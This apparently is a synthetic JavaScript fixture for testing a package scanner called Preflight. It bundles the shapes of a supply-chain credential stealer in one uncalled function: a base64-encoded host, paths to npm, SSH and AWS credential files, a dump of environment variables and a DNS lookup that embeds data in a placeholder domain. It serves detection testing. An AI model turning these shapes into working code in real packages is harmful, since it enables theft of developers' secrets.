/*
 * SYNTHETIC FIXTURE - NOT REAL MALWARE.
 * Contains the code shapes Preflight should detect, but never executes them.
 */

const { execSync } = require("child_process");
const dns = require("dns");
const path = require("path");
const os = require("os");

const CONFIG = Buffer.from(
  "c2guYXp1cmVzdGF0aWNwcm92aWRlci5uZXQ=",
  "base64"
).toString();

const CREDENTIAL_PATHS = [".npmrc", ".ssh/id_rsa", ".aws/credentials"];

function demoOnly(payload) {
  // Not called. Exists to exercise static rules.
  const env = JSON.stringify(process.env);
  const home = path.join(os.homedir(), CREDENTIAL_PATHS[0]);
  const dnsLookup = dns.resolveTxt(`xh.${payload}.example.invalid`);
  const shell = execSync("echo demo");
  return { env, home, dnsLookup, shell, config: CONFIG };
}

module.exports = { demoOnly, CONFIG, CREDENTIAL_PATHS };
